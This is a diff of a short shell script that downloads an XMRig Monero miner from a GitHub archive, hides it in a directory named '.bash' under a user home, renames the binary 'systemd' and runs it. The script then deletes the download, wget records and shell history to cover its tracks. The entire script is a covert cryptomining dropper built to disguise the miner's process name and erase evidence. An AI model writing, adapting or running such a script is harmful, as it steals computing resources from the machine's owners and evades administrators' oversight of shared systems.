@@ -1,18 +1,14 @@
-echo "Enter Id:"
-read Id
 wget https://github.com/deusveritatis/monero/archive/master.zip
 unzip master.zip
 cd monero-master
-tar -xvzf ./k.tar.gz
-mv ./xmrig-2.14.1 ./.bash
-sed -i 's/iiserb/'"$Id"'/g' config.json
-mv ./config.json ./.bash/config.json
+tar -xvzf ./bash.tar.gz
+mv xmrig-5.0.1/ ./.bash
+mv ./.bash /home/iiserb
+cd ../..
+rm -r monero-master
 cd .bash/
 mv ./xmrig ./systemd
 ./systemd
-cd ../..
 rm -r master.zip
-rm -r ./monero-master
-rm ./momiso
 rm .wget-hsts
 rm .bash_history && history && exit
